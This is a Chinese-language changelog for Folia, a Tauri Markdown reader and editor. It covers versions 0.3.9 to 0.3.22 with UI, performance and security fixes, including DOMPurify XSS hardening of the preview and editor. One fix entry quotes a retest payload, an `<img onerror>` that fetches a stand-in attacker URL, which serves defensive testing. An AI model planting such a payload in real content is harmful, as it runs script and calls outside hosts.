- 标签栏降级标记（ISS-42 可选增强）：草稿过大未自动保存（>256KB 降级仅内存）的标签，在标签名前显示琥珀色圆点（`.tabbar-draft-too-large`，oklch 琥珀 + 25% 光晕）并带「草稿过大未自动保存」悬停提示，与底部 StatusBar 三态提示呼应，多标签切换时也能一眼识别降级标签。
- 桌面端真机 CDP 端到端验证脚本 `scripts/etv-folia.mjs`（ISS-161，参考同类项目的 CDP 验证脚本）：通过 Playwright `connectOverCDP` 直连 `WEBKIT_INSPECTOR_SERVER=127.0.0.1:9222` 暴露的 `tauri dev` WKWebView，复用现有 page target（不调 `/json/new`），跑 3 个真实桌面端场景：A 键盘快捷键回归（`Cmd+Alt+P` Word 预览 / `Cmd+Alt+M` HTML 预览 / `Cmd+,` 设置页）、B 拖放链路 IPC 节点可达性（`__TAURI_INTERNALS__` 桥、`pending_opened_paths`、`opened-paths` 事件总线）、C Tauri IPC 真实调用（`read_opened_document` / `write_opened_document` round-trip + 扩展名守卫）。截图保存到 `.playwright-mcp/`（已 gitignore）。新增 `npm run etv:dev`（带 CDP 端口启动 Tauri 开发模式）、`npm run etv:run`（跑脚本）、`npm run etv`（同 etv:run，单场景运行可用 `node scripts/etv-folia.mjs a|b|c`）。**仅 macOS WKWebView，不进 GitHub Actions**：由开发者本地复测真实桌面端行为，覆盖 `e2e/` Playwright 浏览器版无法验证的键盘 Cmd 修饰键 / IME / Tauri IPC / Finder 拖放 / `asset.localhost` 等 macOS 偶发差异。

### Performance

- 显著改善超长 Markdown 文件（数 MB / 数千行）打开时的白屏与编辑卡顿（ISS-159 / DEC-091）。**打开阶段**：Rust `read_opened_document` 由返回 `Vec<u8>`（被 Tauri 序列化成 JSON 数字数组，10MB 文件膨胀为 30-40MB、内存峰值达原始文件数倍并卡死 WebView）改为返回原始字节 `tauri::ipc::Response`，前端 `invoke` 直接拿到 `ArrayBuffer`，序列化膨胀消除、内存峰值降到约原始文件一倍。**编辑阶段**：`handleContentChange` 中的大纲（TOC）全文正则提取改为 150ms 防抖（文件内容仍每键同步保存）；active-heading 的 `MutationObserver` 不再依赖 `file.content`，避免每次按键都 `disconnect` 后重新 `observe` 整棵 DOM。

### Fixed

- 修复最近更新回归（ISS-170 / DEC-104）：`WysiwygEditorPane` 的 IR sanitize 现在同时清理可见 preview DOM 和隐藏的 `code[data-type="html-block"]` marker 文本，避免 `VditorIRDOM2Md()` 保存时从 marker 还原 `<script>` / `onerror` / `onload` 等危险源码；`input()` 保存链路改用 sanitize 后的当前 `editor.getValue()`，不再把 Vditor 回调传入的旧值写回 session。tear-off tab 独立窗口 URL 新增 `tabIds` 查询参数，启动时按指定 tab 过滤共享 session，避免独立窗口恢复整套标签。新增真实 Lute round-trip、组件 input 保存、session bootstrap、tabIds URL 解析与 Rust URL 单测；Vite dev + Playwright 实测 tab-window 只显示目标标签，危险 HTML 持久化后保留 svg/rect 并剥离危险内容。
- **ISS-170 review follow-up**（PR review 发现的 3 个回归点）：① `bootstrapSessionForWindow` 不再因 `initialTabIds` 为空数组就回退到主 session——tab-window 缺 `tabIds` 查询参数或全部失配时一律返回占位 tab，避免独立窗口意外展示主窗口整套标签（安全边界）；② `input()` 复杂表分支在 sanitize 命中时跳过 `serviceReplaceHtmlTableBlock` 注入 `original.html`，防止 DOMPurify 刚剥离的 `onclick` / `onerror` 等被反向灌回导致 sanitize 失效（XSS bypass）；③ 5 处 `sanitizeIrDom` 调用包 `try/finally`、3 处 `requestAnimationFrame` 回调开头检查 `cancelled`（外部 setValue useEffect 用 `editorRef.current === editor` 判定），防止 `DOMException` 让 `sanitizingRef` 卡死或组件卸载后 RAF 回调访问 destroyed Vditor 抛 `TypeError`。新增 2 个 `bootstrapSessionForWindow` 测试覆盖空 `tabIds` / 全部失配走占位 tab；新增 2 个 `WysiwygEditorPane` 测试覆盖 sanitize 命中跳过 restore + 卸载后 RAF 不抛错。
- 预览 sanitize 加固，消除 ISS-168 后处理残留的 `<img onerror>` / `<svg onload>` 理论窗口（ISS-169 / DEC-099）。根因：ISS-168 用 Vditor `after()` 回调对已写入 DOM 的 HTML 做 DOMPurify 后处理，依赖 `after()` 在浏览器异步加载 onerror/onload 之前同步触发——通常成立但理论上非绝对安全。修复：sanitize 改在 Vditor.preview 的 `transform(html: string): string` 钩子里完成（参考 `node_modules/vditor/src/ts/markdown/previewRender.ts:95-98`：Vditor 在 `previewElement.innerHTML = html` 之前同步调用 `transform(html)`），对 Lute 已转义的 HTML 用 `sanitizeForVditor`（DOMPurify `USE_PROFILES: { html, svg, svgFilters }`）做 sanitize，再让 Vditor 写入 DOM——危险元素从未以「危险态」插入 DOM，从源头消除 onerror 窗口。`after()` 钩子仍保留给「本地图片解析」与「toc id 注入」用，不再调用 `sanitizeForVditor(el.innerHTML)` 后处理。`sanitizeForVditor` 本身未改（ISS-168 的 6 个测试继续覆盖），新增 `PreviewPane.test.tsx` 4 个测试断言 transform 钩子已注册、剥离 `<script>` / `onerror`、与 `sanitizeForVditor` 行为等价、`after()` 不再触发 sanitize。预览编辑器（`WysiwygEditorPane`）本次未改。**真实 Tauri WebView 实测待桌面包复测**：CSP `connect-src 'self'` + 本地文档场景下 `<img onerror>` 不会从外联触发，但建议按 PR 描述在桌面端用恶意 `<img src="x" onerror="fetch('http://attacker/')">` 测试块复测，确认 DOM 永远观察不到危险态。
- 修复 Markdown 阅读预览区的内联 `<svg>`（及子元素 rect/text/path/marker/defs/line 等）完全不显示的问题（ISS-168）。根因：`PreviewPane` 使用 Vditor/Lute 内置 sanitize（`markdown.sanitize: true`），其白名单不含 svg 系列标签，整块 SVG 被过滤为空白。修复采用方案 A 的安全变体（后处理 sanitize，安全性不降）：① `PreviewPane` 的 Vditor `markdown.sanitize` 改为 `false`，让 svg 透传；② 新增 `sanitizeForVditor()`（`src/services/sanitizeService.ts`），在 Vditor `after()` 渲染完成后对 `element.innerHTML` 用 DOMPurify（`USE_PROFILES: { html, svg, svgFilters }`）做后处理——保留 svg 与子元素及滤镜，剥离 `<script>`、`on*` 事件处理器、`javascript:` 协议。关键：未采用「预处理 md 源」方案，因为实测 DOMPurify 会把裸尖括号转义（`a < b` → `a &lt; b`、`<https://example.com>` autolink 被截断），破坏用户代码块；后处理作用于 Lute 已转义的 HTML，`&lt;` 不会被双重转义，无回归。编辑器面板（`WysiwygEditorPane`）本次未改，待后续评估（涉及 `getValue()` 保存语义与 IR 光标）。
- 完结 ISS-168 编辑器部分第一版：`WysiwygEditorPane`（IR 模式）改用 IR DOM 后处理方案以保留 SVG 并剥离可见 preview DOM 中的危险内容；后续保存语义回归由 ISS-170 修复。
- 修复切换标签（`switchTab`）时左侧大纲（TOC）不随激活标签更新的问题（ISS-163）。根因：`AppLayout` 的 `setToc` 仅由 `handleOpen` / `handleOpenPath` / `handleContentChange`（150ms 防抖）三个回调触发，没有任何 effect / render 逻辑监听 `activeTabId` 变化，导致 `switchTab` 后 TOC 仍展示上一个 active tab 的标题大纲。修复：`useState<TocItem[]>` 改为 lazy initializer 从 `activeTab.file.content` 预生成 TOC（首屏即正确），新增 `lastTocTabId` state + render-time 同步重置（`lastTocTabId !== activeTabId` 时立即 `setToc`），配套新增仅依赖 `activeTabId` 的 useEffect 调用 `cancelPendingTocRefresh` 取消旧 tab 挂起的防抖刷新（避免 ISS-159 同款竞态）。node + playwright 实操：注入 2 个 tab 的 session，13/13 断言通过（含反向验证：在 main 分支代码上脚本超时失败，确认能捕获 bug）。
- 超大文件（>10MB）在 Rust 后端用 `metadata` 读取前拦截并返回明确错误，前端弹出原生「该文件过大（超过 10MB），暂不支持打开」提示（中 / 英 / 日三语），避免超大文件撑爆内存（ISS-159）。
- 修复 Markdown 文件中的本地相对路径图片完全不显示的问题（DEC-096）。根因为 Tauri asset 协议三处配置全部缺失，导致 `convertFileSrc()` 生成的 asset URL 被三重拦截：① `src-tauri/Cargo.toml` 的 `tauri` crate 未启用 `protocol-asset` feature（Rust 端不编译 asset protocol handler）；② `tauri.conf.json` 无 `assetProtocol.enable/scope`（默认 scope 空，拒绝所有路径）；③ CSP `img-src 'self' data: file:` 不含 `asset:` / `http://asset.localhost`（host 不匹配 `'self'`，被 CSP 拦截）。补齐配置（`protocol-asset` feature + `assetProtocol: { enable: true, scope: { allow: ["$HOME/**/*"], requireLiteralLeadingDot: false } }` + CSP `img-src`/`media-src` 加 `asset: http://asset.localhost`）后，同目录、跨目录、含中文 / 空格 / emoji 目录名、`%20` URL 编码的相对路径图片均正常加载。`localImageResolver` / `resolveLocalResourcePath` 代码本身正确，此前纯粹是 Tauri 配置缺失。
- 修复打开 Word 预览面板时纸张两侧明显留白、内容区被挤压的问题（ISS-166 / DEC-097）。根因：`WordPaperPreviewPane` 的 `PREVIEW_HORIZONTAL_PADDING = 56` 预留过多，纸张缩放后宽度 = 面板宽 - 56，仅占面板约 88%；叠加 `.word-preview-scroll` 内边距偏大。修复：`PREVIEW_HORIZONTAL_PADDING` 56→16（匹配 scroll 左右 padding 8px×2）+ `.word-preview-scroll` padding `18px 18px 40px`→`10px 8px 22px` + `.word-preview-pages` gap `22px`→`12px`。node + playwright 截图实测纸张宽度 404px→444px，基本占满面板（460-16=444）。

## [0.3.22] - 2026-06-13

### Changed

- 底部状态栏新增"状态栏路径"设置项（外观页），可选"完整路径 / 仅文件名 / 首尾保留（推荐）"三种展示策略；默认"首尾保留"模式下，长路径会自动 ellipsis 收缩到 ≤60 字符且始终保留文件名，不会再撑开状态栏。完整路径仍可通过 `title` 提示或双击复制。
- 状态栏高度固定为 22px；状态栏文案、复制反馈与"未保存"标记同步加 `flex-shrink: 0` 避免被长路径挤压。
- 设置页移除独立的"快捷键"Tab；快捷键信息直接合并到 Toolbar 等可交互元素的 `title` 中，覆盖打开 / 保存 / 另存为 / 源码 / Word 预览 / HTML 预览 / 设置 7 个核心按钮（`Cmd+O` / `Cmd+S` / `Cmd+Shift+S` / `Cmd+Alt+S` / `Cmd+Alt+P` / `Cmd+Alt+M` / `Cmd+,`），中 / 英 / 日三语同步。设置页导航现为通用 / 编辑器 / 预览 / 外观 / Word 导出 / HTML 导出 / 授权 / 关于 共 8 个 Tab。
- 新增快捷键：`Cmd+Alt+S` 切换源码模式、`Cmd+Alt+P` 切换 Word 纸张预览、`Cmd+Alt+M` 切换 HTML 预览、`Cmd+,` 打开设置；与既有 `Cmd+O` / `Cmd+S` / `Cmd+Shift+S` / `Cmd+Shift+E` 合并为一致的快捷键面板。
- 重构 HTML 阅读预览 / Markdown 预览切换为 Vditor WYSIWYG 一体化（ISS-155 / DEC-085）：所有 Markdown 与 HTML 文档默认直接进入 Vditor WYSIWYG（`mode: 'ir'`），普通段落与不含 `rowspan` / `colspan` 的简单表格内文字可直接编辑；含 `rowspan` / `colspan` 的复杂表格区域在 Vditor 中标记为 `contenteditable="false"` + `data-folia-locked="table"`，结构与文字均不可改，输入回调对比原 `findHtmlTableBlocks` 自动恢复被改动的复杂表格源码。

### Performance

- 设置页拆分为按 Tab 懒加载：`SettingsPage` 模块不再一次性 import 所有子 section；切换 Tab 时只下载对应 section chunk，GeneralSection 与 SettingsPage 在 `preloadSettingsPage` 中并行预热。`ExportSection` / `WechatSection` 等较重的子组件不再拖累首次打开设置页的耗时。骨架屏行数同步从 9 减为 8 以匹配新的导航数。

### Removed

- 删除 `htmlReadingPreference` 状态机、`canToggleHtmlReadingPreview` 派生、`handleExitHtmlReadingPreview` / `handleOpenHtmlReadingPreview`，以及顶部"普通 Markdown 预览 ↔ HTML 阅读预览"toolbar 切换按钮；删除 `html-reading-toolbar` 中"退出 HTML 预览 / 编辑表格"两个按钮和 `markdown-preview-toolbar` 整栏。
- 删除结构化表格编辑入口 `htmlTableEditorVisible` 与 `HtmlTableEditor` 组件（用户确认不使用结构化编辑），Toolbar 源码按钮作为兜底编辑入口；`HtmlPresentationPane` 对 `.md` 文档的入口同步收紧为只对 `.html` / `.htm` 文件生效。

### Fixed

- 修复 Markdown 文件中通过 `![](./path.webp)` 引用的本地相对路径图片（WebP / PNG / JPG / GIF 等）无法在 Vditor 编辑区、Word 纸张预览、HTML 导出预览中正常渲染的问题：新增 `localImageResolver` 服务，在 Vditor 渲染完成后自动将 `<img src="./relative">` 解析为 Tauri asset 协议 URL（`https://asset.localhost/...`），与已有的 `htmlPresentationService` 共用路径解析逻辑。`.webp` 与 `.png` / `.jpg` 表现一致。

- 修复 Vditor WYSIWYG（即时渲染）模式中输入 `**foo**` 后 `**` 字符仍以蓝色 marker 持续可见、加粗看上去未生效的问题：`WysiwygEditorPane` 监听 `keydown` 钩子并在停顿 220ms 后强制清除 IR 节点的 `vditor-ir__node--expand` class，与 Vditor 自身 `blurEvent` 行为对齐；编辑过程中不打断用户，持续键入时 marker 仍可见，停顿后自动折叠。

- 修复打开 Markdown 文件时偶发白屏的问题（v0.3.21 仍存在）：`WysiwygEditorPane` 的 Vditor 初始化 Promise 缺少 `.catch()` 错误处理，任何 import 或初始化失败均静默吞没；`[source]` effect 在 Vditor 就绪前触发时 `editorRef.current` 为 `null`，`setValue` 被跳过后不再重试，导致内容永远不显示。修复后新增 `phase` 状态追踪（`loading → ready | error`），`[source]` effect 在 editor 未就绪时将内容缓存到 `pendingSourceRef`，`after()` 回调中补偿应用；初始化失败时显示可见错误信息和重试按钮。Suspense fallback 文字颜色从 `var(--border)` 改为 `var(--muted)`（浅色主题下可辨别）。中 / 英 / 日三语同步新增 `editorAriaLabel` / `editorInitFailed` / `retryLabel`。

- 修复打开右侧 Word / HTML 预览面板时主 Markdown 区域被反向压扁、行宽急剧收窄的问题：`.main-content` 引入 `--main-min-width: 480px` 阈值，主编辑 / 预览 / HTML 演示容器在 `.right-panel-open` 下保证 480px 最低行宽；右侧面板宽度改为 `clamp(360px, var(--right-panel-width, 460px), calc(100% - 489px))`；800×600 视口下 Word 预览自动折叠，1280×800 视口主区保持可读。新增 `.html-presentation-layout` / `.html-reading-layout` / `.word-preview-open` / `.wechat-preview-open` 显式规则，消除 dangling class。

### Added

- 复杂表格上方 hover 出现"查看原貌"小图标（`<button class="folia-html-table-viewer-trigger">`），点击后弹出 `<HtmlTableViewerOverlay />` 渲染 `createHtmlReadingPreviewHtml` 的忠实 HTML 版本（独立容器，不打断 Vditor 状态），支持 ESC、关闭按钮、点击遮罩三种关闭方式。
- `htmlTableBlockService` 暴露 `classifyHtmlTableBlocks()`，返回 `{ simple, complex }` 两桶以供 Vditor 锁定与输入拦截使用；新增 5 个 `classifyHtmlTableBlocks` 单元测试。

## [0.3.21]

### Changed

- 浮动大纲的横条改为轻量查看入口：横条点击或悬停只展开大纲，不再直接固定；展开面板内新增明确的固定、取消固定和关闭按钮，固定后继续使用左侧常驻栏避免遮挡正文。
- 浮动大纲固定态新增“总是固定大纲”选项：该选项只在大纲已固定为左侧栏时显示，开启后会记住默认固定偏好；取消固定或关闭固定栏会同步回到轻量横条体验。
- 包含原生 HTML 表格的 Markdown 文档仍默认进入 HTML 阅读预览，但预览顶部新增“退出 HTML 预览”，可切回普通 Markdown 预览；普通预览顶部保留“HTML 阅读预览”按钮，方便需要表格稳定渲染时再切回。

### Fixed

- 修复源码模式下点击浮动大纲条目无法跳转的问题：TOC 现在会定位到对应 Markdown 标题行并滚动 CodeMirror 源码编辑区。

## [0.3.20]

### Removed

- 删 `website/` Astro 子目录、官网构建转发脚本 `scripts/run-website.mjs` 和 GitHub Pages 部署 workflow `deploy-website.yml`，官网已迁到独立仓 `cat-xierluo/personal-site` 统一管理。
- 删 `package.json` 中的 `website:dev` / `website:build` / `website:preview` 转发脚本和官网构建相关 npm 依赖；`docs/ARCHITECTURE.md` 改为引用 `personal-site` 仓维护的产品详情页。

### Changed

- `README.md` §"官方网站" 链接改到 `https://cat-xierluo.github.io/personal-site/folia/`，移除"调试官方静态网站"小节和相关 `npm run website:build` 命令提示。
- 浮动大纲固定后改为左侧常驻栏，占用独立阅读空间，避免大纲面板覆盖正文；固定状态下可通过面板右上角按钮取消固定。
- 阅读预览和 `.docx` HTML 预览支持按中文字体、英文字体独立响应设置变更：通过新增的 `--preview-chinese-font-family` / `--preview-latin-font-family` CSS 变量直接消费 `useSettings` 同步写入根容器的字串，Vditor 渲染实例无需重新解析 Markdown；标题字体仍走 `--preview-heading-font-family`，对 Vditor 生成的标题元素以 `!important` 优先于自带 `font-family`。

### Fixed

- 修复在设置页切换中文字体、英文字体或标题字体后，主阅读预览面板不实时更新的问题：以前 CSS 变量变化被 Vditor 自带 `font-family` 覆盖，需要切换文件或重新触发渲染才会生效；现在 CSS 变量直接控制正文 / 列表 / 表格 / 引用等 Vditor 元素的字体并以 `!important` 优先于其默认样式。
- 修复阅读预览正文只消费英文字体变量的问题：正文、列表、表格和引用现在按英文字体栈 → 中文字体栈 → 总体阅读字体回退组合，避免 `sans-serif` 提前截断用户选择的中文字体。

## [0.3.19]

### Fixed

- 修复 `v0.3.18` 桌面端打开后主页面可能空白的问题：生产包资源改为相对路径，避免 Tauri WebView 从嵌入页面加载 `/assets/...` 失败。
- 修复生产构建进入“源码模式”可能白屏的问题：CodeMirror 相关依赖按包边界拆分 vendor chunk，不再通过任意 `maxSize` 切分打散类继承顺序。
- 新增 Vite 构建配置回归测试，覆盖桌面包相对资源路径和 CodeMirror 拆包策略。

## [0.3.18]

### Changed

- Settings / 预览字体改为中文字体、英文字体、标题字体三组选择，默认入口统一为“默认”，并支持自定义字体名；Markdown 阅读预览、`.docx` HTML 预览和即时渲染编辑同步使用新字体栈。
- Markdown H1-H6 默认跟随正文或统一标题字体，标题层级改用字号、间距和渐进字重表达，不再按层级混用衬线/非衬线。

## [0.3.17]

### Fixed

- 修复 `v0.3.16` 后系统双击 Markdown / HTML 文件仍可能显示空白的问题：桌面端通过文件关联、启动参数、拖放或“重新打开上次文件”得到的路径改由 Rust 后端受控读取，再交给前端按当前编码解码，避免前端文件插件路径授权不足导致内容未加载。
- 修复系统路径打开 HTML 后进入“编辑源码”仍可能为空的问题；新增覆盖“系统传入 HTML 路径 → 后端读取原始源码 → 源码编辑器显示”的整链路回归测试。
- 修复通过系统路径打开 Markdown / HTML 后保存可能继续受前端文件插件权限影响的问题；已有路径保存改由 Rust 后端受控写回，另存为仍保留系统保存对话框链路。

## [0.3.16]

### Changed

- Release workflow 的 Gitee 附件同步改为带超时的 best-effort 步骤：GitHub Release 和 `latest.json` 仍是发布主路径，Gitee 上传过慢或失败时不再无限挂起后续发布流程。

### Fixed

- 修复将 Folia 设为 Markdown / HTML / Word 默认打开应用后，双击文件不会直接加载的问题；macOS 运行中打开文件会进入同一窗口，Windows 启动参数打开链路也会读取系统传入路径。
- 修复 `.html` 文件预览仍按 Markdown 链路渲染，导致残留 HTML 符号、白色源码框、右对齐和空行语义丢失的问题；HTML 阅读页现在提取正文后走安全直读预览，并保留受控的对齐与空白样式。
- 修复 HTML 阅读页点击“编辑源码”可能显示空白的问题，新增真实 CodeMirror 渲染回归保护，确保源码编辑区拿到当前完整文档内容。
- 修复 `v0.3.14` 发布草稿在 Windows MSI 打包阶段失败的问题；文件关联描述改为 WiX 兼容文本，Windows `.exe` / `.msi` 产物可继续一起发布。
- 修复 `v0.3.15` 发布草稿的 Windows 编译失败问题，保留 Windows 启动参数打开链路所需的 Tauri `Manager` trait。

## [0.3.13]

### Added

- Word 导出自定义 JSON 示例扩展为完整模板，覆盖页面、字体、标题、正文、页码、表格、代码、引用、图片、分割线和列表配置。
- Word 自定义预设导入兼容 md2word YAML 转 JSON 后的常见字段别名与单位，包括 `row_height_cm`、`cell_margin.top/bottom/left/right`、`table.header/body`、`code_block.label/content`、`quote.left_indent_inches` 和页码位置。
- Word 导出 JSON 新增 `styles`、`markdown_mapping` 和 `html_mapping`，可用样式别名统一定义 Markdown 标题、正文、代码块、列表、分割线、表格、图片标题以及 HTML table 选择器的输出规则。

### Changed

- Word 纸张预览和真实 `.docx` 导出继续以同一套 `PresetConfig` 为来源，并补齐标题字体、页码格式/位置、表格背景色、表格对齐、单元格四边距和图片标题的可见样式映射。
- Word 纸张预览和 `.docx` 导出会消费 JSON v2 样式映射；映射引用不存在时导入失败，避免 JSON 中写了样式但实际导出无效。
- 内置 Word 预设中的“公文报告”更贴近 GB/T 9704 公文版式，“学术论文”更贴近 GB/T 7713.2 学术论文常见字号字体。

### Fixed

- 修复 md2word 风格 JSON 只包含 `table.cell_margin.top/bottom/left/right` 时不会触发 dxa 单位转换的问题。
- 修复 JSON v2 表格样式只设置 `cell_margin` 时纸张预览和 `.docx` 单元格边距可能不一致的问题。
- 修复 Word 纸张预览中未配置表格背景色时默认背景变量可能继承文字色的问题。

## [0.3.12]

### Changed

- Markdown 阅读和即时渲染编辑默认改用中文优化字体栈，Settings / 预览字体新增“中文优化”“中文宋体”等预设，改善中文长文与中英文混排观感。
- 优化前端生产构建拆包：React、CodeMirror、Tauri、Vditor、docx / Mammoth / JSZip 等重型依赖拆分为独立 vendor chunks，消除当前 500KB chunk size warning。

### Fixed

- 修复 HTML 表格导出 Word 时正文行仍输出 `w:tblHeader w:val="false"` 的冗余节点；新增真实 `.docx` XML 回归测试，覆盖 `gridSpan`、`vMerge` 和表头行结构。

## [0.3.11]

### Changed

- Word 纸张预览保持快速 HTML/CSS 仿 Word 路线：当前 Markdown 直接渲染为 A4 纸张预览，导出预设驱动页边距、字体、标题、正文、表格和图片样式；真实 `.docx` 生成继续只服务 Word 导出。

### Fixed

- 修复 Word 纸张预览中部分长表格正文单元格会按表头样式渲染的问题，长 HTML 表格预览恢复正常换行且不撑出面板。
- 修复根目录官网脚本在未安装 `website/` 依赖时无法构建的问题；`website:dev`、`website:build`、`website:preview` 会按需补装官网依赖。

## [0.3.10]

### Added

- 新增 `website/` Astro 官方静态网站，提供项目介绍、功能展示、下载入口和 GitHub Pages 自动发布流程。
- 工具栏新增内联更新按钮：发现可用更新后自动后台下载，下载完成后在工具栏显示重启按钮，无需弹窗确认。
- 新增日语 (ja-JP) 完整语言支持，覆盖设置、工具栏、更新等全部文案。
- Word 导出表格支持行高 (HeightRule) 和单元格边距 (cell margins)，从预设配置读取。

### Changed

- 官网浏览器标签页 favicon 改用 Folia 应用自身 logo。
- 官网首屏布局改为居中内容容器，产品预览作为下方居中视觉信号，两侧保留自然留白。
- 官网文案从偏法律文档场景调整为面向知识工作者的复杂 Markdown 阅读、预览和导出定位。
- ESLint 忽略 Astro 官网生成目录，避免 `website/.astro` 类型文件参与桌面应用源码检查。
- Word 纸张预览继续使用导出预设驱动的 A4 纸张样式，补齐更多标题、正文、链接、表格和图片尺寸映射。
- 配置文件（eslint、playwright、tsconfig、vite）从项目根目录移至 `config/` 子目录。
- 更新服务将下载和安装拆分为独立 API，支持后台下载后再重启安装。
- 导出预设设置面板精简布局：移除冗余描述文案，自定义预设使用紧凑模式。
- 关于页更新提示增加后台下载状态文案。
- 许可证描述文案精简。

### Fixed

- 修复 Word 导出未把 Markdown 链接转换为 Word 原生超链接的问题；右侧 Word 纸张预览同步补齐链接颜色、正文颜色和表格字体颜色映射。
- 修复自动更新后台下载期间仍订阅进度事件、导致主界面频繁重绘和卡顿的问题；下载完成前不显示重启入口，完成后才在顶部栏提示重启更新。

### Removed

- 移除 `UpdateDialog` 弹窗组件，更新流程改为工具栏内联状态机。

## [0.3.9]

### Added

- 新增共享 `HtmlTableModel` 与 HTML table block 定位/替换服务，为后续结构化表格编辑器提供稳定基础。
- 新增 HTML 表格结构化编辑器：稳定阅读预览中可选择单个表格，编辑单元格 HTML，追加/删除行列，并只替换目标 `<table>` 源码区块。
- 新增法律 HTML 表格 fixture，覆盖证据目录、材料清单、复杂表头、多 `tbody`、空单元格、长 URL 和长中文内容。
- 导出预设新增启用/停用管理；自定义预设可删除，内置预设可从日常列表中隐藏。
- Settings / Word 导出新增示例 JSON 展开区和单页纸预览；点击预览纸张可打开放大视图，便于比较不同 Word 预设的版式效果。
- Settings / Word 导出新增自定义预设槽位可视化：2 个常规槽位、空槽位导入入口、历史兼容提示和内测授权槽位提示。
- HTML 表格稳定阅读预览新增“编辑源码”入口，用户可从只读阅读视图明确进入源码编辑。
- 新增 `zh-CN` / `en-US` / `ja-JP` 语言设置基础，先覆盖设置导航、关于页、顶部栏和 Word 预览核心文案。
- 关于页新增 Folia 图标、项目地址、作者 GitHub 主页和微信二维码。
- 新增默认浮动 TOC：文档有标题时显示左侧弱刻度，hover 或键盘聚焦展开标题列表，支持轨道点击固定和标题跳转。
- 新增暗色模式，覆盖主界面、设置页、Word 预览外壳、Floating TOC 和编辑器容器。
- 新增 HTML 预览入口与右侧预览面板：当前 Markdown 可渲染为 HTML 文章预览，并提示本地相对图片。
- HTML 预览面板支持复制到公众号编辑器和导出 HTML：复制写入 `text/html` 与 `text/plain` fallback，导出文件包含完整 HTML 结构；正文节点已按当前 HTML 预设生成内联样式，同时保留文档级 CSS 作为兜底。
- Settings 新增“HTML 导出”分区，提供 `预设库 / 自定义槽位 / CSS 示例` 二级页、3 套简单通用内置 HTML 主题、2 个常规自定义 CSS 槽位，支持导入 `.css` 样式文件和 `.json` 预设文件，并可导出当前 CSS 预设 JSON。
- Settings 新增“授权”分区，可输入内测码并显示 Word / HTML 自定义预设槽位上限；内测授权启用后槽位上限从 2 个提升到 8 个。
- HTML 文件新增“演示模式”：`.html/.htm` 默认仍使用安全阅读预览，用户点击演示模式后在隔离 iframe 中运行当前 HTML，并提供上一页、下一页和返回阅读预览操作。

### Changed

- README 补充普通用户下载入口、macOS 首次运行命令、开发/构建说明，并参考 Legal Skills 项目完善作者介绍。
- 顶部栏按钮按“文件操作 / 视图与导出 / 导航设置”分组，并改用更柔和的 folder/save/braces/book/sliders 图标；tooltip 更明确，同时保持透明、低视觉权重的 icon-only 风格。
- 顶部栏不再提供“大纲”按钮，TOC 改为内容区左侧浮动导航，不再挤占横向布局。
- Floating TOC 的固定/取消固定统一由左侧横线轨道触发，展开面板不再显示图钉按钮；折叠刻度按标题层级显示不同长度和粗细。
- 普通 Markdown 编辑从 Vditor `wysiwyg` 切换为 Vditor `ir` 即时渲染模式，更接近 Obsidian Live Preview：当前编辑块显示 Markdown 标记，离开后保持预览观感。
- 默认内置 Word 导出预设精简，移除“法律服务方案”；常规版本自定义导出预设限制为 2 个槽位，历史超限预设继续兼容读取。
- Word 导出设置页将内置预设与自定义预设槽位分组展示，内置预设不占用自定义槽位。
- Word 导出设置页改为 `预设库 / 自定义槽位 / JSON 示例` 二级页面；纸张预览只在预设库显示，自定义槽位和 JSON 示例使用全宽内容区。
- HTML 导出设置页收敛为同构二级页面：CSS 示例页使用全宽内容区，不再常驻文章预览；自定义槽位的导入 / 导出主路径统一表述为 CSS 预设。
- Word / HTML 导出设置页的三级选项改为等宽铺满横条；顶部“删除/停用”入口移除，HTML 文章预览只在预设库显示并支持点击放大，内置 CSS 预设条目不再展示来源行。
- Word / JSON 示例页和 HTML / CSS 示例页精简为只展示可选中示例文本；导入、复制、导出当前预设等动作保留在自定义槽位页。
- Word / HTML 自定义槽位页移除顶部导入按钮，空槽位点击导入预设文件；槽位说明进一步压缩。HTML 导出自定义槽位页不再提供手写 CSS 表单，Word / HTML 设置页预览侧只显示预设名，不重复展示描述或点击提示。
- 内测授权页文案收敛为“内测码只用于开启本机额外自定义槽位”。
- Word / HTML 设置页预览缩略框收窄，放大预览弹层高度限制到设置页尺度，减少按钮和内容挤压。
- Word / HTML 自定义槽位页的锁定入口统一改为“内测授权 / 输入内测码”，并跳转到授权页。
- Markdown 主显示区继续扩大可视高度：WYSIWYG / Live Preview、普通预览和稳定 HTML table 阅读预览同步压缩上下留白，内容更贴近底部状态栏路径区域。
- 自动检查更新恢复为可配置开关，默认开启；关于页只保留开关和手动检查更新入口，不再展示“启动后延迟检查”等技术说明。
- 自动更新发现新版后改为后台下载；下载完成后在顶部栏显示“重启更新”，不再用下载弹窗阻塞编辑和页面切换。
- 快捷键设置精简为打开、保存、另存为和导出 Word，移除暂未实际提供的命令面板占位。
- Tauri capabilities 新增 `process:allow-restart`，保证安装更新后可以正常重启应用。
- Tauri CSP 为 HTML 演示模式允许内联演示脚本，并保留本地图片、字体和媒体资源兜底；同目录 JS / CSS / 图片会优先内联进演示 iframe，外部网络连接继续受限。
- 项目定位从"专为法律文档设计"调整为"面向知识工作者的 Markdown 阅读与 Word 导出工具"，强调 HTML 表格 Markdown 预览与 Word 纸张预览导出两大核心能力。
- 关于页信息结构重新整理：版本只显示版本号，自动检查更新和手动检查更新同栏，项目地址与作者链接使用一致字体。
- 关于作者区改为作者信息与微信二维码两栏，移除微信号文字和作者业务方向描述。
- Word 纸张预览中的超长 HTML 表格现在按行分页，并在分页片段中重复表头；含 `rowspan` 的行组会保守地保持在同一页。
- Word 纸张预览的导出预设选择器改为 Folia 风格的轻量弹出列表，显示预设来源、说明和当前选中状态，并只展示已启用预设。
- 右侧预览面板改为互斥模式：无面板、Word 预览、HTML 预览三种状态不会同时打开，并共用同一套右侧宽度拖拽逻辑。
- Settings 侧栏标题默认从 `Settings` 改为“设置”。
- 自动更新运行时 endpoint 暂时收敛为 GitHub Releases `latest.json`；Gitee 继续作为 Release 产物同步镜像，但不再写入客户端静态更新源，避免 Gitee 不支持 GitHub 风格 `/releases/latest/download/...` 直链导致更新检查先命中无效地址。
- `scripts/create-updater-manifest.mjs` 改为从签名文件自动生成全平台 `latest.json` / `latest-gitee.json`，并在缺少必需平台签名时失败发布。
- 开发配置文件集中迁移到 `config/`，根目录仅保留包管理文件、前端入口和项目主目录；日常开发命令改为通过 npm scripts 指向配置路径。

### Fixed

- 修复打包 App 中标题栏拖动仍无法移动窗口的问题：补齐 Tauri 窗口拖动/双击最大化权限，移除与手动 fallback 冲突的 `-webkit-app-region`，并兼容桌面 WebView 中 `MouseEvent.buttons` 不稳定的情况。
